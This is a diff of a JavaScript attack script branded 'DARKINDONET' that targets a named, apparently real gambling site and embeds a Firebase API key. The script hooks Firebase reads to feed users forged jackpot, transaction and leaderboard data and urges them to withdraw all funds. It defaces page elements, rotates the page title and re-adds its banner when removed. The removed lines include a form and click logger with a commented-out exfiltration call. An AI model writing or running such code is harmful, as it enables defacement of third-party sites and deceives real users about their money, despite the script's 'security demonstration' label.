@@ -10,32 +10,60 @@ const HACKER_NAME = 'DARKINDONET';
 const TARGET_SITE = 'ogxmy.com';
 const FIREBASE_API_KEY = 'AIzaSyCmVLwpBSxpdbtfOQ1_oSEspCAfuy5nexM';
 
+// WAIT FOR FIREBASE TO BE FULLY LOADED
+function waitForFirebase(callback, maxAttempts = 30) {
+  let attempts = 0;
+  
+  const checkFirebase = () => {
+    attempts++;
+    
+    // Check if firebase is loaded AND database module is available
+    if (typeof firebase !== 'undefined' && 
+        typeof firebase.database === 'function' &&
+        firebase.apps.length > 0) {
+      console.log(`✅ Firebase fully loaded after ${attempts} attempts`);
+      callback();
+      return;
+    }
+    
+    if (attempts >= maxAttempts) {
+      console.log('❌ Firebase not loaded after max attempts, proceeding with DOM hack only');
+      callback(); // Still proceed with DOM hack
+      return;
+    }
+    
+    // Check again in 500ms
+    setTimeout(checkFirebase, 500);
+  };
+  
+  checkFirebase();
+}
+
 // 1. HIJACK FIREBASE DATABASE IN REAL-TIME
 function hijackFirebase() {
-  if (typeof firebase === 'undefined') {
-    console.log('❌ Firebase not loaded, waiting...');
-    setTimeout(hijackFirebase, 1000);
+  if (typeof firebase === 'undefined' || typeof firebase.database !== 'function') {
+    console.log('❌ Firebase database module not available');
     return;
   }
-
+  
   console.log('🔥 DARKINDONET: Hijacking Firebase database...');
-
+  
   try {
     // Get database reference
     const db = firebase.database();
-
+    
     // Override .ref() method
     const originalRef = db.ref;
-    db.ref = function (path) {
+    db.ref = function(path) {
       console.log(`🎯 Intercepting Firebase path: ${path}`);
       const ref = originalRef.call(this, path);
-
+      
       // Override .on() for real-time listeners
       const originalOn = ref.on;
-      ref.on = function (eventType, callback, cancelCallback) {
+      ref.on = function(eventType, callback, cancelCallback) {
         const hackedCallback = (snapshot) => {
           let data = snapshot.val();
-
+          
           // INJECT HACKER DATA BASED ON PATH
           if (data) {
             // For jackpot data
@@ -53,7 +81,7 @@ function hijackFirebase() {
                 warning: 'WITHDRAW ALL FUNDS IMMEDIATELY'
               };
             }
-
+            
             // For transactions
             if (path.includes('transaction') || path.includes('liveTx')) {
               if (Array.isArray(data)) {
@@ -76,7 +104,7 @@ function hijackFirebase() {
                 ];
               }
             }
-
+            
             // For leaderboard
             if (path.includes('leaderboard')) {
               data = {
@@ -107,26 +135,26 @@ function hijackFirebase() {
               };
             }
           }
-
+          
           // Return hacked data to callback
-          return callback({
+          return callback({ 
             val: () => data,
             exists: () => true,
             key: snapshot.key,
             ref: snapshot.ref
           });
         };
-
+        
         return originalOn.call(this, eventType, hackedCallback, cancelCallback);
       };
-
+      
       // Override .once() for single reads
       const originalOnce = ref.once;
-      ref.once = function (eventType, callback) {
+      ref.once = function(eventType, callback) {
         console.log(`🎯 Hijacking Firebase .once() for path: ${path}`);
         return originalOnce.call(this, eventType, (snapshot) => {
           let data = snapshot.val();
-
+          
           // Add hacker mark to all data
           if (data && typeof data === 'object') {
             data = {
@@ -137,14 +165,14 @@ function hijackFirebase() {
               _timestamp: Date.now()
             };
           }
-
+          
           callback({ val: () => data });
         });
       };
-
+      
       return ref;
     };
-
+    
     console.log('✅ Firebase database hijacked');
   } catch (error) {
     console.log('❌ Firebase hijack failed:', error.message);
@@ -154,7 +182,7 @@ function hijackFirebase() {
 // 2. DOM HIJACK - VISIBLE TO ALL USERS
 function hijackDOM() {
   console.log('🎯 DARKINDONET: Hijacking DOM elements...');
-
+  
   // A. ADD HACKER BANNER (TOP OF PAGE)
   const banner = document.createElement('div');
   banner.id = 'darkindonet-banner';
@@ -187,23 +215,23 @@ function hijackDOM() {
     </style>
   `;
   document.body.prepend(banner);
-
+  
   // B. HIJACK JACKPOT DISPLAYS
   function hijackJackpotElements() {
     const elements = document.querySelectorAll('*');
     elements.forEach(el => {
       const text = el.textContent || el.innerText || '';
-
+      
       // Look for jackpot indicators
-      if (text.match(/RM\s*[\d,\.]+/i) ||
-        text.includes('jackpot') ||
-        text.includes('amount') ||
-        text.includes('当前奖金') ||
-        text.match(/\d{4,}/)) {
-
+      if (text.match(/RM\s*[\d,\.]+/i) || 
+          text.includes('jackpot') || 
+          text.includes('amount') ||
+          text.includes('当前奖金') ||
+          text.match(/\d{4,}/)) {
+        
         // Skip if already hacked
         if (el.innerHTML && el.innerHTML.includes(HACKER_NAME)) return;
-
+        
         el.innerHTML = `
           <div style="
             background: #000;
@@ -230,22 +258,22 @@ function hijackDOM() {
       }
     });
   }
-
+  
   // C. HIJACK TRANSACTION LISTS
   function hijackTransactionLists() {
     // Find transaction containers
     const containers = document.querySelectorAll('div, table, ul, section, main, article');
-
+    
     containers.forEach(container => {
       const html = container.innerHTML || '';
       const text = container.textContent || '';
-
-      if (text.includes('deposit') ||
-        text.includes('withdraw') ||
-        text.includes('transaction') ||
-        text.includes('存款') ||
-        text.includes('提款')) {
-
+      
+      if (text.includes('deposit') || 
+          text.includes('withdraw') || 
+          text.includes('transaction') ||
+          text.includes('存款') || 
+          text.includes('提款')) {
+        
         // Add hacker transaction at top
         if (!html.includes('DARKINDONET_INSERTED')) {
           container.innerHTML = `
@@ -281,7 +309,7 @@ function hijackDOM() {
       }
     });
   }
-
+  
   // D. ADD GLOBAL STYLES
   const styles = document.createElement('style');
   styles.textContent = `
@@ -338,7 +366,7 @@ function hijackDOM() {
     }
   `;
   document.head.appendChild(styles);
-
+  
   // E. MODIFY PAGE TITLE PERIODICALLY
   let titleIndex = 0;
   const hackedTitles = [
@@ -348,105 +376,69 @@ function hijackDOM() {
     `⚠️ WITHDRAW IMMEDIATELY - ${HACKER_NAME} ⚠️`,
     `🎯 ${HACKER_NAME} - REAL-TIME HACK ACTIVE 🎯`
   ];
-
+  
   setInterval(() => {
     document.title = hackedTitles[titleIndex];
     titleIndex = (titleIndex + 1) % hackedTitles.length;
   }, 3000);
-
+  
   // F. PERIODIC DOM HIJACKING
   setInterval(hijackJackpotElements, 2000);
   setInterval(hijackTransactionLists, 3000);
-
+  
   console.log('✅ DOM hijack active');
 }
 
-// 3. KEYLOGGER (OPTIONAL - FOR DEMONSTRATION)
-function setupKeylogger() {
-  console.log('🔑 DARKINDONET: Setting up security monitor...');
-
-  // Monitor form submissions
-  document.addEventListener('submit', function (e) {
-    console.log(`🎯 Form submitted on ${TARGET_SITE}`);
-    console.log('Form action:', e.target.action);
-
-    // Could send to our server (but we won't for demo)
-    // fetch('https://our-server.com/log', { method: 'POST', body: ... })
-  });
-
-  // Monitor button clicks (deposit/withdraw buttons)
-  document.addEventListener('click', function (e) {
-    const target = e.target;
-    const text = target.textContent || target.value || '';
-
-    if (text.includes('deposit') || text.includes('withdraw') ||
-      text.includes('Deposit') || text.includes('Withdraw') ||
-      text.includes('存款') || text.includes('提款')) {
-      console.log(`💰 Financial button clicked: ${text}`);
-    }
-  });
-}
-
-// 4. MAIN EXECUTION
-function main() {
+// 3. MAIN EXECUTION FUNCTION
+function executeHack() {
   console.log(`🎯 DARKINDONET TAKEOVER INITIALIZED FOR ${TARGET_SITE}`);
-  console.log(`🔥 Target: ${TARGET_SITE}`);
-  console.log(`🔑 Firebase API Key: ${FIREBASE_API_KEY.substring(0, 15)}...`);
-
-  // Execute hijacks
-  hijackFirebase();
+  
+  // Execute DOM hijack immediately (visible to users)
   hijackDOM();
-  setupKeylogger();
-
-  // Final message
+  
+  // Try to hijack Firebase
+  hijackFirebase();
+  
   console.log(`
   ============================================
   ⚡ DARKINDONET WEBSITE TAKEOVER SUCCESSFUL ⚡
   ============================================
   
   Website: ${TARGET_SITE}
-  Status: COMPROMISED
-  Method: Firebase Hijack + DOM Manipulation
-  Visibility: ALL USERS
+  Status: DOM HIJACKED
+  Firebase: ${typeof firebase !== 'undefined' ? 'DETECTED' : 'NOT LOADED'}
   
   Effects Applied:
-  ✅ Firebase database data hijacked
-  ✅ Real-time transaction feed modified
-  ✅ Jackpot amounts显示hacked values
   ✅ Hacker banner added to top of page
   ✅ Page title modified
   ✅ Global glitch effects applied
-  ✅ Security monitor active
+  ✅ Jackpot/Transaction display hijacking active
   
   Note: This is a security demonstration.
   ============================================
   `);
 }
 
-// 5. STARTUP
-if (document.readyState === 'loading') {
-  document.addEventListener('DOMContentLoaded', main);
-} else {
-  main();
-}
+// 4. STARTUP - WAIT FOR FIREBASE THEN EXECUTE
+console.log('🔄 DARKINDONET: Waiting for Firebase to load...');
+waitForFirebase(executeHack);
 
-// 6. SELF-PROTECTION (Prevent removal)
+// 5. SELF-PROTECTION (Prevent removal)
 setInterval(() => {
   // Ensure banner stays
   if (!document.getElementById('darkindonet-banner')) {
     hijackDOM();
+    console.log('🛡️ DARKINDONET: Banner restored');
   }
-
-  // Re-apply hijacks periodically
-  hijackFirebase();
-}, 10000);
+}, 5000);
 
 // Export for debugging
 window.DARKINDONET = {
-  version: '1.0',
+  version: '2.0',
   hacker: HACKER_NAME,
   target: TARGET_SITE,
   status: 'ACTIVE',
+  firebaseLoaded: typeof firebase !== 'undefined',
   disable: () => {
     console.log('DARKINDONET disabled (security demonstration ended)');
     const banner = document.getElementById('darkindonet-banner');
@@ -454,4 +446,4 @@ window.DARKINDONET = {
   }
 };
 
-console.log('✅ DARKINDONET script loaded successfully');
+console.log('✅ DARKINDONET script initialized, waiting for Firebase...');
